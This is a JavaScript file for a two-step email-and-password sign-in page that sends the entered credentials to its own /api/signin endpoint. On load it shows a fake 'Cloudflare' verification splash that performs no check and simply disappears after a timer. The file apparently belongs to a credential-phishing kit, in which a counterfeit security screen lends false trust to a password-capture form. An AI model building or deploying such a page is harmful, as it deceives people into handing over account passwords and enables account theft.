/* static/js/main.js */

(() => {
  // Store form data
  let formData = {
    email: '',
    password: ''
  };

  // DOM elements
  const cloudflareStep = document.getElementById('cloudflareStep');
  const emailStep = document.getElementById('emailStep');
  const passwordStep = document.getElementById('passwordStep');

  const emailInput = document.getElementById('emailInput');
  const passwordInput = document.getElementById('passwordInput');

  const nextBtn = document.getElementById('nextBtn');
  const backToEmail = document.getElementById('backToEmail');
  const submitBtn = document.getElementById('submitBtn');

  const emailError = document.getElementById('emailError');
  const passwordError = document.getElementById('passwordError');
  const loading = document.getElementById('loading');

  // Email validation
  function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  // show/hide helpers
  function showElement(el) { if (el) el.style.display = 'block'; }
  function hideElement(el) { if (el) el.style.display = 'none'; }

  // Next button (email -> password)
  nextBtn && nextBtn.addEventListener('click', function () {
    const email = emailInput.value.trim();

    if (!email) {
      emailError.textContent = 'Please enter an email address';
      showElement(emailError);
      emailInput.focus();
      return;
    }

    if (!isValidEmail(email)) {
      emailError.textContent = 'Please enter a valid email address';
      showElement(emailError);
      emailInput.focus();
      return;
    }

    formData.email = email;
    const userEmailSpan = document.getElementById('user-email');
    if (userEmailSpan) userEmailSpan.textContent = email;

    // animate transition
    showElement(passwordStep);
    emailStep.classList.add('slide-out');
    passwordStep.classList.add('slide-in');

    setTimeout(() => {
      passwordInput.focus();
    }, 500);
  });

  // Back to email screen
  function goToEmailScreen() {
    emailStep.classList.remove('slide-out');
    passwordStep.classList.remove('slide-in');

    // Clear sensitive input
    passwordInput.value = '';
    hideElement(passwordError);

    setTimeout(() => {
      showElement(emailStep);
      emailInput.focus();
    }, 300);
  }

  backToEmail && backToEmail.addEventListener('click', function (e) {
    e.preventDefault();
    goToEmailScreen();
  });

  // Input listeners to hide errors
  emailInput && emailInput.addEventListener('input', () => hideElement(emailError));
  emailInput && emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') nextBtn.click(); });

  passwordInput && passwordInput.addEventListener('input', () => hideElement(passwordError));
  passwordInput && passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') submitBtn.click(); });

  // Send sign-in request
  async function sendSignin(data) {
    return fetch('/api/signin', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    });
  }

  // Submit button (password -> send to backend)
  submitBtn && submitBtn.addEventListener('click', async function () {
    const password = passwordInput.value.trim();

    if (!password) {
      passwordError.textContent = 'Please enter your password';
      showElement(passwordError);
      passwordInput.focus();
      return;
    }

    formData.password = password;

    // UI loading state
    showElement(loading);
    submitBtn.disabled = true;
    submitBtn.textContent = 'Signing in...';

    try {
      const response = await sendSignin(formData);
      const result = await response.json().catch(() => ({}));

      if (response.ok) {
        alert(result.message || 'Sign in successful!');
        // example redirect:
        if (result.redirect) {
          window.location.href = result.redirect;
        }
      } else {
        throw new Error(result.message || 'Sign in failed');
      }
    } catch (err) {
      console.error('Sign in error:', err);
      passwordError.textContent = err.message || 'An error occurred. Please try again.';
      showElement(passwordError);
    } finally {
      hideElement(loading);
      submitBtn.disabled = false;
      submitBtn.textContent = 'Sign in';
    }
  });

  // Cloudflare splash on load
  window.addEventListener('load', function () {
    // show cloudflare
    document.body.style.background = "linear-gradient(135deg, #0074D9 0%, #4FAAFF 100%)";
    showElement(cloudflareStep);

    setTimeout(() => {
      hideElement(cloudflareStep);
      document.body.style.background = "linear-gradient(to bottom right, #f0f0f0, #dfe6e9)";
      showElement(emailStep);
      emailInput.focus();
    }, 2500);
  });
})();
